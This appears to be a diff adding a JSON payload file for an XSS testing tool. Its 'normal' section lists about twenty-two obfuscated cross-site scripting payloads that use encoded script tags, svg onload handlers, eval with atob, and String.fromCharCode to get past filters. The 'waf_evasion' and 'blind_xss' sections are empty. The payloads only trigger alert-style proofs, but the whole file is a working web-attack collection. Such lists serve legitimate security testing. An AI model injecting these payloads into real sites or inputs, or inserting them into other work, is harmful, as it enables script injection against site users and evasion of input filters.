@@ -1,0 +1,37 @@
+{
+  "normal": {
+    "description": "Normal XSS payloads",
+    "payloads": [
+      "%3Cinput%2Fonmouseover=%22javaSCRIPT&colon;confirm&lpar;1&rpar;%22%3E",
+      "<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>",
+      "%27;alert%28String.fromCharCode%2888,83,83%29%29%2F%2F%27;alert%28String.fromCharCode%2888,83,83%29%29%2F%2F%22;alert%28String.fromCharCode%2888,83,83%29%29%2F%2F\\%22;alert%28String.fromCharCode%2888,83,83%29%29%2F%2F--%3E%3CSCRIPT%3E%27%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C%2FSCRIPT%3E",
+      "&lt;script src=&quot;data:text&#x2F;plain;base64,YWxlcnQoJ1hTUyAjNTUnKQ==&quot;&gt;&lt;&#x2F;script&gt;",
+      "<img src='x' onerror='\u0061\u006C\u0065\u0072\u0074('XSS #80')'>",
+      "<script>a=String.fromCharCode;eval(a(97)+a(108)+a(101)+a(114)+a(116)+'('XSS #82')')</script>",
+      "%3Cimg src=%22worksinchrome:prompt&#x28;%28%27XSS #85%27%29&#x29;%22 onerror=%27eval%28src%29%27%3E",
+      "&lt;iframe srcdoc=&quot;&lt;script&gt;alert&#x28;&#x27;XSS #83&#x27;&#x29;&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;",
+      "</plaintext><script>alert('XSS #91')</script>",
+      "&lt;script src=&quot;data:,\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;&quot;&gt;&lt;&#x2F;script&gt;",
+      "'></textarea></script><svg/onload=eval(atob('YWxlcnQoMSk='))>//",
+      "jaVasCript:`&#x2F;*-&#x2F;*`&#x2F;*\\`&#x2F;*&#x27;&#x2F;*&quot;/**/(alert&#x28;1&#x29;)&#x2F;&#x2F;%250A&lt;&#x2FsTyLe&#x2F;&lt;&#x2FtItLe&#x2F;&lt;&#x2FteXtArEa&#x2F;&lt;&#x2FsCrIpT&#x2F;--!&gt;\\x3cSvG&#x2FoNLoAd=alert&#x28;1&#x29;&#x2F;&#x2F;\\x3e",
+      "%22%3E%3Cnoscript%3E%3Ctitle%3E%3Ctextarea%3E%3Cstyle%3E%3Ctemplate%3E%3Cnoembed%3E%3Cscript%3E%3Chtml onmouseover=alert%281%29%2F%2F%3E",
+      "&lt;svg&#x2F;onload=alert&#x28;1&#x29;&#x2F;&#x2F;&gt;`",
+      "<iframe/srcdoc='<svg/onload=alert(1)>'></iframe>",
+      "<svg/onload=import('data:text/javascript,alert(1)')>",
+      "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+      "&lt;svg&#x2F;onload=location=`jav`+`ascript:`+`alert%281%29`&gt;",
+      "%3Csvg%2Fonload=eval%28atob%28%27YWxlcnQoMSk=%27%29%29%3E",
+      "&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;&#x2F;script&#x3E;",
+      "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x32;&#x39;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;",
+      "%253Cscript%253Ealert%252831%2529%253C%252Fscript%253E"
+    ]
+  },
+  "waf_evasion": {
+    "description": "",
+    "payloads": []
+  },
+  "blind_xss": {
+    "description": "",
+    "payloads": []
+  }
+}
